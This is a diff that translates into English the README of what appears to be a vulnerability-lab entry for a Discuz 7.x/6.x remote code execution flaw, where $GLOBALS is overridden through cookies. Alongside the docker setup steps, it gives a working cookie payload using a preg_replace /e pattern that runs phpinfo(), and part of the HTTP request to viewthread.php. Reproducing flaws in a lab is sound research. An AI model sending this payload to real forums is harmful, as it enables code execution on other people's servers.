@@ -1,26 +1,35 @@
-# Discuz 7.x/6.x 全局变量防御绕过导致代码执行
+# Discuz 7.x/6.x Remote Code Execution via Global Variable Override
 
-由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，我们通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-具体原理请参考：
+Discuz is a popular forum software widely used in China. A remote code execution vulnerability exists in Discuz 7.x/6.x versions due to insufficient global variable protection.
 
-- https://www.secpulse.com/archives/2338.html
+In PHP 5.3.x, the default value of `request_order` in php.ini is set to "GP", which means `$_REQUEST` no longer includes `$_COOKIE` by default. This allows attackers to override global variables through cookies by injecting `$GLOBALS`, leading to remote code execution.
 
-## 漏洞环境
+References:
 
-执行如下命令启动Discuz 7.2：
+- <https://www.secpulse.com/archives/2338.html>
+
+## Environment Setup
+
+Execute the following command to start Discuz 7.2:
 
 ```
 docker compose up -d
 ```
 
-启动后，访问`http://your-ip:8080/install/`来安装discuz，数据库地址填写`db`，数据库名为`discuz`，数据库账号密码均为`root`。
+After starting the container, visit `http://your-ip:8080/install/` to install Discuz. Use the following database settings:
+
+- Database Host: `db`
+- Database Name: `discuz`
+- Username: `root`
+- Password: `root`
 
 ![](1.png)
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加`GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`：
+After installation, find an existing post and send a request with the following cookie that contains the payload `GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`:
 
 ```
 GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
@@ -35,8 +44,8 @@ Connection: close
 
 ```
 
-可见，phpinfo已成功执行：
+The `phpinfo()` function will be successfully executed, demonstrating the remote code execution vulnerability:
 
 ![](2.png)
 
-> 网上文章说需要一个带表情评论的帖子，实际测试发现并不需要，这块仍需阅读代码来解释原因。
+> Note: Some articles online claim that a post with an emoji comment is required, but the actual test found that it was not necessary, and the reason still needs to be analyzed from the code.
